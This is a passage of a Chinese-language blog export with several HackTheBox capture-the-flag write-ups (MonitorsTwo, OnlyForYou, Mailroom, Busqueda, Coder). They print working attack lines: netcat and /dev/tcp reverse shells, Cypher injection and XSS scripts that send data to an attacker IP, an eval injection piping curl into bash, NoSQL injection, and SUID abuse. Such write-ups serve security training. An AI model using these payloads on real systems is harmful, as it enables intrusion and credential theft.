HackTheBox","slug":"MonitorsTwo-HackTheBox","date":"2023-04-30T06:31:09.000Z","updated":"2023-09-04T03:27:51.760Z","comments":true,"path":"2023/04/30/MonitorsTwo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/04/30/MonitorsTwo-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/MonitorsTwo 10.10.11.211 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.211Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 13:29 CSTNmap scan report for 10.10.11.211Host is up (0.11s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Login to CactiService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 46.55 seconds 80cacti 1.2.22: cacti搜到这个： Cacti: Unauthenticated Remote Code Execution | Sonarhttps://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/ sAsPeCt488/CVE-2022-46169: PoC for CVE-2022-46169 - Unauthenticated RCE on Cacti &lt;= 1.2.22https://github.com/sAsPeCt488/CVE-2022-46169 也可以直接用msf： 1msf6 &gt; use exploit/linux/http/cacti_unauthenticated_cmd_injection 打到容器的www-data: /entrypoint.sh根目录发现entrypoint.sh，查看内容得到mysql： mysqlmysql中获取到两个hash,破解出来marcus的密码： 123456789mysql --host=db --user=root --password=root cacti -e \"show tables\"mysql --host=db --user=root --password=root cacti -e \"select * from user_auth\"admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjCmarcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4Csudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtmarcus : funkymonkey user flagmarcus ssh登录，得到user flag： 另外登录时提示有邮件，查看邮件里面提到三个漏洞： 1234567cat /var/mail/marcusCVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed. 提权信息根据邮件中信息，提权应该是通过CVE-2021-41091： Insufficiently restricted permissions on data directory · Advisory · moby/mobyhttps://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558 根据描述就是外部宿主机调用docker内suid程序 Docker回到容器的www-data,检查suid发现/sbin/capsh： docker root利用capsh的suid得到容器的root： capsh | GTFOBinshttps://gtfobins.github.io/gtfobins/capsh/#suid 然后给容器内的bash添加suid 12/sbin/capsh --gid=0 --uid=0 --chmod +s /bin/bash 提权 &amp; root flag再回到marcus ,查看挂载得到对应目录，然后直接运行docker内的suid bash得到root： 12345marcus@monitorstwo:~$ findmnt/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1//var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff/bin/bash -p shadow12root:$6$KQUOT7rGEpEUTjFc$hA2mxdKhpH7RQ3g5ZGjzkPrRpq1jCqmiZY9SgqaoTb1BI6APMo14Ed&#x2F;Ptbfnf5MAkCbBbHEbRqwzPc301fuat1:19366:0:99999:7:::marcus:$6$mobk0CS45kj4tF6o$bOq9Svoa9Q9AbmfIz2K210JOwv1wS3AFhaCsYkewZleSwBysUj&#x2F;a57p0YhRvi40A6cfkDFHfnuOP3useo.ms&#x2F;1:19366:0:99999:7::: 参考资料 Cacti: Unauthenticated Remote Code Execution | Sonarhttps://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/ sAsPeCt488/CVE-2022-46169: PoC for CVE-2022-46169 - Unauthenticated RCE on Cacti &lt;= 1.2.22https://github.com/sAsPeCt488/CVE-2022-46169 capsh | GTFOBinshttps://gtfobins.github.io/gtfobins/capsh/#suid Insufficiently restricted permissions on data directory · Advisory · moby/mobyhttps://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OnlyForYou - HackTheBox","slug":"OnlyForYou-HackTheBox","date":"2023-04-24T05:46:18.000Z","updated":"2023-08-28T01:14:33.223Z","comments":true,"path":"2023/04/24/OnlyForYou-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/04/24/OnlyForYou-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/OnlyForYou 10.10.11.210 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.210Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 10:24 CSTNmap scan report for 10.10.11.210Host is up (0.093s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 e883e0a9fd43df38198aaa35438411ec (RSA)| 256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)|_ 256 445f7aa377690a77789b04e09f11db80 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://only4you.htb/|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 32.69 seconds 80需要加hosts，一个官网： 110.10.11.210 only4you.htb 子域名扫描子域名发现beta： 1234ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://only4you.htb/\" -H 'Host: FUZZ.only4you.htb' -fs 178[Status: 200, Size: 2191, Words: 370, Lines: 52, Duration: 299ms] * FUZZ: beta beta.only4you.htb同样加hosts后访问,提供一份代码下载： beta source根据代码可以知道是flask 应用，download里发现LFI，不能 出现..,不能以../开头，但可以直接使用绝对路径： LFI一步步读文件: 123&#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default&#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;app.py&#x2F;var&#x2F;www&#x2F;only4you.htb&#x2F;form.py 发现email的domain拼接到执行的命令中，存在一些过滤, 但注意判断方法，只要匹配到符合正则的字符串就可以继续进行后续处理,导致命令注入： 命令注入 shell利用命令注入得到www-data shell： 11@1.com|rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|sh -i 2&gt;&amp;1|nc 10.10.14.8 4444 &gt;&#x2F;tmp&#x2F;f socks proxy简单的枚举发现本地端口一些服务，打通代理： 12345678wget http://10.10.14.8:7777/chisel_1.7.6_linux_amd64chmod +x chisel_1.7.6_linux_amd64# local./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse# target./chisel_1.7.6_linux_amd64 client 10.10.14.8:9999 R:socks infogogs 30003000端口是gogs： Neo4j 74747474端口是neo4j: 80018001需要登录，简单的admin:admin进去： Cypher Injection根据已有信息，8001的服务应该是使用的neo4j，尝试neo4j的Cypher Injection： Cypher Injection (neo4j) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j 1&#39; OR 1&#x3D;1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#39;http:&#x2F;&#x2F;10.10.14.8:7777&#x2F;?version&#x3D;&#39; + version + &#39;&amp;name&#x3D;&#39; + name + &#39;&amp;edition&#x3D;&#39; + edition as l RETURN 0 as _0 &#x2F;&#x2F; 后面就是一步步获取信息，得到一些用户名和密码hash： 123&#39; OR 1&#x3D;1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM &#39;http:&#x2F;&#x2F;10.10.14.8:7777&#x2F;?label&#x3D;&#39;+label as l RETURN 0 as _0 &#x2F;&#x2F;&#39; OR 1&#x3D;1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM &#39;http:&#x2F;&#x2F;10.10.14.8:7777&#x2F;?&#39; + p +&#39;&#x3D;&#39;+toString(f[p]) as l RETURN 0 as _0 &#x2F;&#x2F; 得到的hash破解出密码： 12admin a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 ThisIs4Youjohn 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 admin user flag &amp; Gogs得到的账号密码组合后可以登录ssh以及gogs： 1john ： ThisIs4You user flagjohn用户目录得到user flag： 提权信息检查sudo发现是pip从gogs是那里下载： 很明显是让我们通过gogs托管一个恶意包，然后pip去执行,虽然字面上是download，但实际上是会去运行代码的: Malicious Python Packages and Code Execution via pip download · Embrace The Redhttps://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ 提权 &amp; root flag修改demo里setup.py中的代码，打包，传到gogs上： wunderwuzzi23/this_is_fine_wuzzi: Demo of a malicious python package that will run code upon pip download or installhttps://github.com/wunderwuzzi23/this_is_fine_wuzzi 注意原本的Test repo是私有的，需要设置成公开的才能下载 123456pip3 install buildpython3 -m buildhttp://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gzsudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz shadow12root:$6$TJLQffVnCXmnRBpq$Shtj6r4nJt672cmV2bhnlK9wb6YlI1tKpJoupUoVM&#x2F;LFd7vmbLuDX4jtlYW3Lcft2sjWmHk5h58Q8vaFDOtFR.:19326:0:99999:7:::john:$6$BBuIQ1RjM9BXy2zw$5.O1009Bf4oXy&#x2F;qGS5dp9U514X5GJMbkYBGgcWlmTVCzn3H.E6wF1cVAmjZzf8UCExE0dmfxGylCix6q29icq0:19326:0:99999:7::: 参考资料 Cypher Injection (neo4j) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j Malicious Python Packages and Code Execution via pip download · Embrace The Redhttps://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ wunderwuzzi23/this_is_fine_wuzzi: Demo of a malicious python package that will run code upon pip download or installhttps://github.com/wunderwuzzi23/this_is_fine_wuzzi","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Mailroom - HackTheBox","slug":"Mailroom-HackTheBox","date":"2023-04-19T04:29:49.000Z","updated":"2023-08-21T01:35:00.281Z","comments":true,"path":"2023/04/19/Mailroom-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/04/19/Mailroom-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Mailroom 10.10.11.209 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.209Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:01 CSTNmap scan report for 10.10.11.209Host is up (0.096s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)| 256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)|_ 256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)80/tcp open http Apache httpd 2.4.54 ((Debian))|_http-server-header: Apache/2.4.54 (Debian)|_http-title: The Mail RoomService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds 80物流服务,页面底部可以得到域名 mailroom.htb： 子域名扫描添加hosts后扫描子域名,得到git： 12345610.10.11.209 mailroom.htbffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://mailroom.htb/\" -H 'Host: FUZZ.mailroom.htb' -fs 0,7748[Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 117ms] * FUZZ: git git.mailroom.htb同样添加hosts后访问,是一个gitea： gitea没开注册，但探索里能直接访问一个repo： auth.php查看代码，auth里可以知道用了mongo，并且得到另一个开了2FA的子域名： 123$client = new MongoDB\\Client(\"mongodb://mongodb:27017\"); // Connect to the MongoDB database$message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token; staff-review-panel添加hosts尝试外部访问，403： inspect.php查看inspect.php发现直接使用shell_exec,对可控的inquiry_id存在一些过滤，但注意没有过滤掉反引号： XSS简单测试功能，发现contact存在XSS： staff-review-panel那就可以尝试通过XSS让管理员去访问staff-review-panel，把结果发送给我们： 1email&#x3D;miao%40miao.com&amp;title&#x3D;miao&amp;message&#x3D;&lt;script+src%3d&quot;http%3a&#x2F;&#x2F;10.10.14.4&#x2F;miao.js&quot;&gt;&lt;&#x2F;script&gt; 但还是需要登录的： nosql注入利用XSS去打auth.php尝试进行nosql注入,但注入成功后提示2FA在邮件里，所以还是要一步步来最终得到账号密码: 123456email[$ne]&#x3D;1&amp;password[$ne]&#x3D;1email[$regex]&#x3D;^t&amp;password[$ne]&#x3D;1email&#x3D;tristan@mailroom.htb&amp;password[$regex]&#x3D;^6tristan 69trisRulez! miao.js12345678910var url = \"http://staff-review-panel.mailroom.htb/index.php\";var attacker = \"http://10.10.14.4/out\";var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState == XMLHttpRequest.DONE) &#123; fetch(attacker + \"?\" + encodeURI(btoa(xhr.responseText))); &#125;&#125;xhr.open('GET', url, true);xhr.send(null); auth.js1234567891011var url = \"http://staff-review-panel.mailroom.htb/auth.php\";var attacker = \"http://10.10.14.4/out\";var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState == XMLHttpRequest.DONE) &#123; fetch(attacker + \"?\" + encodeURI(btoa(xhr.responseText))); &#125;&#125;xhr.open('POST', url);xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send('email[$ne]=1&amp;password[$ne]=1'); 命令注入得到的账号密码可以ssh登录，但还没到user，但已经可以读邮件获取staff-review-panel认证链接： 转发本地80端口出来，使用邮件里的2FA链接访问认证后的staff-review-panel，利用inspect.php的命令注入，得到www-data shell 1234sudo ssh tristan@10.10.11.209 -L 80:127.0.0.1:80inquiry_id&#x3D;&#96;curl 10.10.14.4&#x2F;shell -o &#x2F;tmp&#x2F;shell&#96;inquiry_id&#x3D;&#96;bash &#x2F;tmp&#x2F;shell&#96; git config里得到matthew账号密码,但并不能直接ssh登录： 123url &#x3D; http:&#x2F;&#x2F;matthew:HueLover83%23@gitea:3000&#x2F;matthew&#x2F;staffroom.git HueLover83# user flagtristan用户SSH session里，使用得到的matthew账号密码su切过去，得到user flag: 12matthewHueLover83# 提权信息matthew用户目录里发现trista有读权限的personal.kdbx，下载到本地： 1scp tristan@10.10.11.209:/home/matthew/personal.kdbx . 运行pspy64,发现kpcli,直接strace去获取信息，操作要非常快，根据read中得到的字符还原得到keepass密码： 12345678wget http://10.10.14.4:7777/pspy64chmod +x ./pspy64./pspy64strace -e read -p pid# \\010 is a del character!sEcUr3p4$$w0rd9 keepass使用得到的密码打开kdbx文件，得到root密码： 123456# keepass# \\010 is a del character!sEcUr3p4$$w0rd9# root passa$gBa3!GA8 root flag使用得到的密码su切到root： shadow123root:$6$eSs&#x2F;sq0j1FH6EyFi$UJKfsByoNiJoacmC6Ko44cOPuLRn3vX6KfsFDtqCo7EvRYN0mnPMZkDrENFLYZPppr3SsK7K5cHtgTaEu&#x2F;4ZE.:19430:0:99999:7:::tristan:$6$VcPf8uXhQ1WTXpJp$vn02AxnM7Memo7.SMnM9r.P3vRw93O15zzpFuSwQaIjOkilBYTdo2H&#x2F;URHyBXVz0tBYZuR4Salj7GueyPHvvA&#x2F;:19372:0:99999:7:::matthew:$6$2zFwPXOaAMBhFYSV$TaNzocDMNPZ6FIm7C3Egt7bJszN2CwaUrnrDyczRC.hc75cyoMhFH&#x2F;E3De4H2MrhCDQIJB4UrhNyj8WcnvCvf.:19372:0:99999:7::: 参考资料 NoSQL injection - HackTrickshttps://book.hacktricks.xyz/pentesting-web/nosql-injection kpcli - A command line interface for KeePasshttps://kpcli.sourceforge.io/ strace(1) - Linux manual pagehttps://man7.org/linux/man-pages/man1/strace.1.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Busqueda - HackTheBox","slug":"Busqueda-HackTheBox","date":"2023-04-10T06:33:35.000Z","updated":"2023-08-14T03:03:22.852Z","comments":true,"path":"2023/04/10/Busqueda-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/04/10/Busqueda-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Busqueda 10.10.11.208 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.208Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 13:09 CSTNmap scan report for 10.10.11.208Host is up (0.11s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)|_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://searcher.htb/Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 42.07 seconds 80需要加hosts： 110.10.11.208 searcher.htb 一个聚合搜索,Searchor 2.4.0: ArjunSharda/Searchor: ⚡️ Quick and easy searching tasks in one library.https://github.com/ArjunSharda/Searchor searchor搜索发现相关漏洞： searchor vulnerabilities | Snykhttps://security.snyk.io/package/pip/searchor Merge pull request #130 from dan-pavlov/remove-eval-from-cli · ArjunSharda/Searchor@1601650https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b 根据代码可以知道原本直接使用eval执行了query，所以构造poc: 1234# cat shellbash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1engine=GitHub&amp;query=http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\\n+import+os\\n+os.system(\"curl+http%3a//10.10.14.8:7777/shell|bash\")','a','single'))%2b'&amp;auto_redirect= user flag得到svc用户shell： 提权信息写公钥后ssh登录方便操作，然后简单的枚举，/var/www/app/.git/config中得到密码，svc用户复用这个密码，检查sudo发现python： 1url &#x3D; http:&#x2F;&#x2F;cody:jh1usoih2bkjaspwe92@gitea.searcher.htb&#x2F;cody&#x2F;Searcher_site.git 对应文件没有读权限，直接尝试运行给出三个选项，测试运行发现3000端口的gitea和mysql容器： docker 使用给出的docker-inspect查看配置信息： 1234sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='&#123;&#123;json .Config&#125;&#125;' mysql_dbsudo python3 /opt/scripts/system-checkup.py docker-inspect --format='&#123;&#123;json .Config&#125;&#125;' gitea\"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF\",\"MYSQL_USER=gitea\",\"MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh\",\"MYSQL_DATABASE=gitea\" gitea转发3000端口访问gitea，administrator复用了mysql的密码(用户名可以用cody用户登录进去得到)： 123ssh svc@10.10.11.208 -L 3000:127.0.0.1:3000administrator yuiu1hoiu4i5ho1uh 登录进去发现scripts，里面发现对应的脚本文件: 查看system-checkup，发现当执行full-checkup时，执行的是当前路径的full-checkup.sh： 那么我们就可以自定义一个full-checkup.sh来执行任意命令 提权 &amp; root flag自定义一个full-checkup.sh来执行任意命令 12345678910111213svc@busqueda:/tmp/miao$ nano ./full-checkup.shsvc@busqueda:/tmp/miao$ cat full-checkup.sh#!/bin/bashchmod +s /bin/bashsvc@busqueda:/tmp/miao$ ls -al /bin/bash-rwxr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bashsvc@busqueda:/tmp/miao$ chmod +x full-checkup.shsvc@busqueda:/tmp/miao$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup[+] Done!svc@busqueda:/tmp/miao$ ls -al /bin/bash-rwsr-sr-x 1 root root 1396520 Jan 6 2022 /bin/bashsvc@busqueda:/tmp/miao$ /bin/bash -p shadow12root:$y$j9T$gvo.xCkdFraDE0rqgshTQ0$WXZwNFLr3bmzWWE0xwRJjJBbKk9nHOUPa7C7Pgaaj&#x2F;D:19363:0:99999:7:::svc:$y$j9T$W0hJlLgllX2dVYzi&#x2F;khoR.$DEi7R3YR2b.63JxcCdxOecK48PTrm5SZXM2HI84imO6:19363:0:99999:7::: 参考资料 ArjunSharda/Searchor: ⚡️ Quick and easy searching tasks in one library.https://github.com/ArjunSharda/Searchor Merge pull request #130 from dan-pavlov/remove-eval-from-cli · ArjunSharda/Searchor@1601650https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Coder - HackTheBox","slug":"Coder-HackTheBox","date":"2023-04-05T04:33:09.000Z","updated":"2023-12-18T00:36:23.616Z","comments":true,"path":"2023/04/05/Coder-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/04/05/Coder-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Coder 10.10.11.207 端口扫描80，443和常规域端口： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566$ nmap -sC -sV -Pn 10.10.11.207Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 14:41 CSTNmap scan report for 10.10.11.207Host is up (0.083s latency).Not shown: 987 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-04-04 08:44:05Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.| ssl-cert: Subject: commonName=dc01.coder.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb| Not valid before: 2022-06-30T04:24:26|_Not valid after: 2023-06-30T04:24:26443/tcp open ssl/http Microsoft IIS httpd 10.0|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.| tls-alpn:|_ http/1.1|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server| http-methods:|_ Potentially risky methods: TRACE| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US| Not valid before: 2022-11-04T17:25:43|_Not valid after: 2032-11-01T17:25:43445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.| ssl-cert: Subject: commonName=dc01.coder.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb| Not valid before: 2022-06-30T04:24:26|_Not valid after: 2023-06-30T04:24:263268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.| ssl-cert: Subject: commonName=dc01.coder.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb| Not valid before: 2022-06-30T04:24:26|_Not valid after: 2023-06-30T04:24:263269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)|_ssl-date: 2023-04-04T08:44:50+00:00; +2h01m50s from scanner time.| ssl-cert: Subject: commonName=dc01.coder.htb| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc01.coder.htb| Not valid before: 2022-06-30T04:24:26|_Not valid after: 2023-06-30T04:24:26Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode:| 311:|_ Message signing enabled and required| smb2-time:| date: 2023-04-04T08:44:43|_ start_date: N/A|_clock-skew: mean: 2h01m49s, deviation: 0s, median: 2h01m49sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 75.53 seconds 80/443直接访问是IIS默认页面： 445smb可以匿名访问： SMBDevelopmentDevelopment里发现一个加密文件和对应的加密程序，还发现有adcs相关内容： 下载下来分析： 12345smb: \\Temporary Projects\\&gt; mask \"\"smb: \\Temporary Projects\\&gt; recurse ONsmb: \\Temporary Projects\\&gt; prompt OFFsmb: \\Temporary Projects\\&gt; cd ..smb: \\&gt; mget * Encrypter.exe.net程序，直接反编译分析代码,根据代码可以知道是根据时间戳作为随机数种子生成key和iv，使用AES进行加密： 所以直接根据文件时间得到当时加密的时间戳(注意时差)，对应编写解密程序,解密得到一个7z压缩包： keepass解压得到一个key和一个keepass密码库，直接使用key解密即可得到保存的一些信息： 123Authenticator backup codes xxxTeamcity s.blade veh5nUSZFFoqz9CrrhSeuwhA https:&#x2F;&#x2F;teamcity-dev.coder.htbO365 s.blade@coder.htb AmcwNO60Zg3vca3o0HDrTC6D Decrypt.cs123456789101112131415161718192021222324252627282930313233343536using System.IO;using System;using System.Security.Cryptography;public class HelloWorld&#123; public static void Main(string[] args) &#123; FileInfo fileInfo &#x3D; new FileInfo(&quot;s.blade.enc&quot;); string destFile &#x3D; Path.ChangeExtension(fileInfo.Name, &quot;.dec&quot;); long value &#x3D; 1668205028; Random random &#x3D; new Random(Convert.ToInt32(value)); byte[] array &#x3D; new byte[16]; random.NextBytes(array); byte[] array2 &#x3D; new byte[32]; random.NextBytes(array2); byte[] array3 &#x3D; DecryptFile(fileInfo.Name, destFile, array2, array); &#125; private static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV) &#123; using (RijndaelManaged rijndaelManaged &#x3D; new RijndaelManaged()) &#123; FileStream stream &#x3D; new FileStream(sourceFile, FileMode.Open); ICryptoTransform transform &#x3D; rijndaelManaged.CreateDecryptor(Key, IV); CryptoStream cryptoStream &#x3D; new CryptoStream(stream, transform, CryptoStreamMode.Read); FileStream fileStream &#x3D; new FileStream(destFile, FileMode.Create); byte[] array &#x3D; new byte[1024]; int count; while ((count &#x3D; cryptoStream.Read(array, 0, array.Length)) !&#x3D; 0) &#123; fileStream.Write(array, 0, count); &#125; &#125; return null; &#125;&#125; Authenticator backup codes123456789101112131415&#123; \"6132e897-44a2-4d14-92d2-12954724e83f\": &#123; \"encrypted\": true, \"hash\": \"6132e897-44a2-4d14-92d2-12954724e83f\", \"index\": 1, \"type\": \"totp\", \"secret\": \"U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2\", \"issuer\": \"TeamCity\", \"account\": \"s.blade\" &#125;, \"key\": &#123; \"enc\": \"U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1\", \"hash\": \"$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV\" &#125;&#125; teamcity OTPkeepass里得到 teamcity相关域名，加hosts后访问,尝试登录，账号密码正确但还有OTP： 非预期 爆破OTPOTP 6位数字，没锁定机制，花时间能爆破出来： brute.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546import argparseimport typingfrom concurrent.futures import ThreadPoolExecutorimport requestsimport tqdmfrom loguru import loggerimport warningswarnings.filterwarnings(\"ignore\")def chunks(l: typing.Iterable, n: int): \"\"\"Yield n number of striped chunks from 